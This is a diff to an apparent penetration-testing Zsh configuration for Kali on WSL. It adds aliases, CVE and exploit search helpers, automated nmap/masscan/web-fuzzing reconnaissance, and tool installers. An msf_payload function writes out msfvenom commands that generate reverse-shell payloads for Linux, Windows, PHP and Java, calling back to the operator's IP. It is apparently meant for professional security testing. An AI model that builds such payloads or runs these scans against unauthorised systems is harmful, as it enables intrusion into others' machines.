@@ -2,7 +2,7 @@
 # WSL Kali Setup - Cybersecurity Configuration
 # =====================================
 # 
-# A clean, tested Zsh configuration for cybersecurity professionals / students / penetration testers 
+# A clean, tested Zsh configuration for cybersecurity professionals
 # GitHub: https://github.com/cyb0rgdoll/wslkalisetup
 # License: GPL-3.0
 #
@@ -124,18 +124,58 @@ cybersec_banner() {
 # BASIC ALIASES
 # =====================================
 
+# File operations
 alias ll='ls -alF'
 alias la='ls -A'
 alias l='ls -CF'
+alias lt='ls -ltr'
+alias lz='ls -lS'
 alias ..='cd ..'
 alias ...='cd ../..'
 alias ....='cd ../../..'
 alias grep='grep --color=auto'
+alias ls='ls --color=auto'
 
 # Quick navigation
 alias workspace='cd ~/cybersec 2>/dev/null || { mkdir -p ~/cybersec && cd ~/cybersec; }'
 alias scans='cd ~/cybersec/scans 2>/dev/null || echo "Run setup-cybersec first"'
 alias reports='cd ~/cybersec/reports 2>/dev/null || echo "Run setup-cybersec first"'
+alias cybersec='cd ~/cybersec'
+alias targets='cd ~/cybersec/targets 2>/dev/null || echo "No targets directory"'
+alias loot='cd ~/cybersec/loot 2>/dev/null || echo "No loot directory"'
+alias wordlists='cd ~/cybersec/wordlists 2>/dev/null || echo "No wordlists directory"'
+
+# Tool shortcuts
+alias ff='ffuf'
+alias ferox='feroxbuster'
+alias mas='masscan'
+alias sub='subfinder'
+
+# Common scan patterns
+alias fastscan='nmap -T4 --top-ports 1000'
+alias allports='nmap -p-'
+alias vulnscan='nmap --script vuln'
+alias webenum='gobuster dir -w /usr/share/wordlists/dirb/common.txt -u'
+
+# Network utilities
+alias ping='ping -c 4'
+alias ports-common='nmap --top-ports 100'
+alias listening='netstat -tuln'
+
+# Quick servers
+alias webserver='python3 -m http.server 8000'
+alias share='python3 -m http.server 8080'
+
+# System info
+alias meminfo='free -h'
+alias cpuinfo='lscpu'
+alias diskinfo='df -h'
+
+# Git shortcuts
+alias gs='git status'
+alias ga='git add'
+alias gc='git commit -m'
+alias gp='git push'
 
 # =====================================
 # CORE CYBERSECURITY FUNCTIONS
@@ -492,8 +532,263 @@ ports() {
 }
 
 # =====================================
-# ENVIRONMENT SETUP
+# VULNERABILITY DATABASE INTEGRATION
 # =====================================
+
+# CVE lookup function
+cve_lookup() {
+    if [ -z "$1" ]; then
+        echo "Usage: cve_lookup <CVE-ID>"
+        echo "Example: cve_lookup CVE-2021-44228"
+        return 1
+    fi
+    
+    local cve_id=$1
+    echo "🔍 Looking up $cve_id..."
+    
+    # Use multiple sources for CVE information
+    echo "📋 CVE Details:"
+    curl -s "https://cve.circl.lu/api/cve/$cve_id" | jq '.' 2>/dev/null || echo "API unavailable"
+    
+    echo ""
+    echo "🔗 References:"
+    echo "https://cve.mitre.org/cgi-bin/cvename.cgi?name=$cve_id"
+    echo "https://nvd.nist.gov/vuln/detail/$cve_id"
+    echo "https://www.exploit-db.com/search?cve=$cve_id"
+}
+
+# Search for exploits
+exploit_search() {
+    if [ -z "$1" ]; then
+        echo "Usage: exploit_search <search_term>"
+        return 1
+    fi
+    
+    local search_term="$1"
+    echo "🔍 Searching for exploits: $search_term"
+    
+    # Use searchsploit if available
+    if command -v searchsploit &> /dev/null; then
+        searchsploit "$search_term"
+    else
+        echo "❌ searchsploit not found. Install with: sudo apt install exploitdb"
+    fi
+    
+    echo ""
+    echo "🔗 Online resources:"
+    echo "https://www.exploit-db.com/search?q=$search_term"
+    echo "https://github.com/search?q=$search_term+exploit"
+}
+
+# =====================================
+# METASPLOIT INTEGRATION
+# =====================================
+
+# Quick Metasploit console
+msf() {
+    if command -v msfconsole &> /dev/null; then
+        echo "🚀 Starting Metasploit Console..."
+        msfconsole -q
+    else
+        echo "❌ Metasploit not found. Install with: sudo apt install metasploit-framework"
+    fi
+}
+
+# Search Metasploit modules
+msf_search() {
+    if [ -z "$1" ]; then
+        echo "Usage: msf_search <search_term>"
+        return 1
+    fi
+    
+    local search_term="$1"
+    echo "🔍 Searching Metasploit modules for: $search_term"
+    
+    if command -v msfconsole &> /dev/null; then
+        msfconsole -q -x "search $search_term; exit"
+    else
+        echo "❌ Metasploit not found"
+    fi
+}
+
+# Generate Metasploit payload
+msf_payload() {
+    local payload_type=${1:-help}
+    local ip=$(get_local_ip)
+    local port=${2:-4444}
+    
+    if [ "$payload_type" = "help" ]; then
+        echo "Usage: msf_payload <type> [port]"
+        echo "Types: linux, windows, php, java, android"
+        return 1
+    fi
+    
+    if ! command -v msfvenom &> /dev/null; then
+        echo "❌ msfvenom not found. Install Metasploit framework"
+        return 1
+    fi
+    
+    case $payload_type in
+        "linux")
+            echo "🐧 Generating Linux x64 payload..."
+            msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f elf > shell_linux
+            echo "✅ Payload saved as: shell_linux"
+            ;;
+        "windows")
+            echo "🪟 Generating Windows x64 payload..."
+            msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe > shell_windows.exe
+            echo "✅ Payload saved as: shell_windows.exe"
+            ;;
+        "php")
+            echo "🌐 Generating PHP payload..."
+            msfvenom -p php/reverse_php LHOST=$ip LPORT=$port -f raw > shell.php
+            echo "✅ Payload saved as: shell.php"
+            ;;
+        "java")
+            echo "☕ Generating Java WAR payload..."
+            msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f war > shell.war
+            echo "✅ Payload saved as: shell.war"
+            ;;
+        *)
+            echo "❌ Unknown payload type. Use: linux, windows, php, java"
+            ;;
+    esac
+}
+
+# =====================================
+# WORKFLOW AUTOMATION
+# =====================================
+
+# Full automated reconnaissance workflow
+full_recon() {
+    if [ -z "$1" ]; then
+        echo "Usage: full_recon <target>"
+        echo "Performs complete automated reconnaissance workflow"
+        return 1
+    fi
+    
+    local target=$1
+    local timestamp=$(date +%Y%m%d_%H%M%S)
+    local recon_dir="full_recon_${target}_${timestamp}"
+    
+    echo "🤖 Starting full reconnaissance workflow for $target"
+    echo "⏱️  This may take 30-60 minutes depending on target size"
+    echo ""
+    
+    # Create working directory
+    mkdir -p "$recon_dir"
+    cd "$recon_dir"
+    
+    # Phase 1: Network Discovery
+    echo "🔍 Phase 1: Network Discovery"
+    if [[ $target =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+(/[0-9]+)?$ ]]; then
+        discover "$target" | tee network_discovery.txt
+    else
+        echo "Target appears to be a domain, skipping network discovery"
+    fi
+    
+    # Phase 2: Port Scanning
+    echo "🔍 Phase 2: Port Scanning"
+    if command -v masscan &> /dev/null; then
+        echo "Using masscan for fast port discovery..."
+        masscan -p1-65535 "$target" --rate=1000 | tee masscan_results.txt
+    fi
+    nmap -sC -sV "$target" -oA detailed_scan
+    
+    # Phase 3: Service Enumeration
+    echo "🔍 Phase 3: Service Enumeration"
+    if nmap -p 80,443,8080,8443 "$target" | grep -q "open"; then
+        echo "Web services detected - starting web enumeration..."
+        webtest_auto "$target"
+    fi
+    
+    if nmap -p 445,139 "$target" | grep -q "open"; then
+        echo "SMB services detected - starting SMB enumeration..."
+        smbenum "$target" | tee smb_enum.txt
+    fi
+    
+    # Phase 4: Vulnerability Assessment
+    echo "🔍 Phase 4: Vulnerability Assessment"
+    enum "$target" | tee vulnerability_scan.txt
+    
+    # Phase 5: Domain Reconnaissance (if applicable)
+    if [[ $target =~ ^[a-zA-Z] ]]; then
+        echo "🔍 Phase 5: Domain Reconnaissance"
+        recon-domain "$target"
+    fi
+    
+    # Generate summary
+    echo "📊 Generating reconnaissance summary..."
+    generate_recon_summary "$target"
+    
+    echo ""
+    echo "✅ Full reconnaissance workflow complete!"
+    echo "📁 Results saved in: $(pwd)"
+    echo "📋 Summary: $(pwd)/recon_summary.txt"
+    cd ..
+}
+
+# Automated web testing (internal function)
+webtest_auto() {
+    local url=$1
+    mkdir -p web_testing
+    cd web_testing
+    
+    # Technology detection
+    whatweb "$url" > whatweb.txt 2>/dev/null
+    
+    # Modern fast directory enumeration
+    if command -v ffuf &> /dev/null && [ -f /usr/share/wordlists/dirb/common.txt ]; then
+        ffuf -u "$url/FUZZ" -w /usr/share/wordlists/dirb/common.txt -o ffuf_results.json -of json -s
+    fi
+    
+    # Recursive scanning with feroxbuster
+    if command -v feroxbuster &> /dev/null; then
+        feroxbuster -u "$url" -w /usr/share/wordlists/dirb/common.txt -o ferox_results.txt
+    fi
+    
+    # Security scanning
+    nikto -h "$url" -o nikto_results.txt 2>/dev/null &
+    
+    cd ..
+}
+
+# Generate reconnaissance summary
+generate_recon_summary() {
+    local target=$1
+    local summary_file="recon_summary.txt"
+    
+    cat > "$summary_file" << EOF
+# Reconnaissance Summary: $target
+Generated: $(date)
+Working Directory: $(pwd)
+
+## Target Information
+- Target: $target
+- Scan Date: $(date)
+- Operator: $(whoami)
+
+## Open Ports
+$(grep -E "^[0-9]+/(tcp|udp)" *.nmap 2>/dev/null | head -20 || echo "No port scan results found")
+
+## Web Services
+$(grep -E "(http|https)" *.txt 2>/dev/null | head -10 || echo "No web services detected")
+
+## Potential Vulnerabilities
+$(grep -E "(VULNERABLE|CVE-|exploit)" *.txt 2>/dev/null | head -10 || echo "No obvious vulnerabilities found")
+
+## Next Steps
+- Review detailed scan results in current directory
+- Investigate interesting ports and services
+- Check for known CVEs for identified services
+- Consider manual testing of web applications
+
+## Files Generated
+$(ls -la | grep -v "^d" | awk '{print "- " $9}')
+EOF
+    
+    echo "📋 Summary generated: $summary_file"
+}
 
 # Setup cybersecurity environment
 setup-cybersec() {
@@ -552,7 +847,8 @@ install-pentest-tools() {
     local tools=(
         "nmap" "gobuster" "nikto" "whatweb" "curl" "wget" "git"
         "enum4linux" "smbclient" "netcat-openbsd" "xclip" "tree" "jq"
-        "make" "unzip"  # Required for neofetch compilation and extraction
+        "make" "unzip" "masscan" "amass" "metasploit-framework"
+        "python3-pip" "searchsploit"
     )
     
     for tool in "${tools[@]}"; do
@@ -564,10 +860,38 @@ install-pentest-tools() {
         fi
     done
     
+    # Install modern tools via other methods
+    install-modern-tools
+    
     # Install neofetch from source since it's not in repos
     install-neofetch
     
     echo "✅ Basic tools installation complete!"
+}
+
+# Install modern high-performance tools
+install-modern-tools() {
+    echo "📦 Installing modern security tools..."
+    
+    # Install ffuf (fast web fuzzer)
+    if ! command -v ffuf &> /dev/null; then
+        echo "Installing ffuf..."
+        wget -q https://github.com/ffuf/ffuf/releases/latest/download/ffuf_2.1.0_linux_amd64.tar.gz
+        tar -xzf ffuf_2.1.0_linux_amd64.tar.gz
+        sudo mv ffuf /usr/local/bin/
+        rm ffuf_2.1.0_linux_amd64.tar.gz
+    fi
+    
+    # Install feroxbuster (recursive directory scanner)
+    if ! command -v feroxbuster &> /dev/null; then
+        echo "Installing feroxbuster..."
+        wget -q https://github.com/epi052/feroxbuster/releases/latest/download/x86_64-linux-feroxbuster.zip
+        unzip -q x86_64-linux-feroxbuster.zip
+        sudo mv feroxbuster /usr/local/bin/
+        rm x86_64-linux-feroxbuster.zip
+    fi
+    
+    echo "✅ Modern tools installation complete!"
 }
 
 # Install neofetch from specific release version
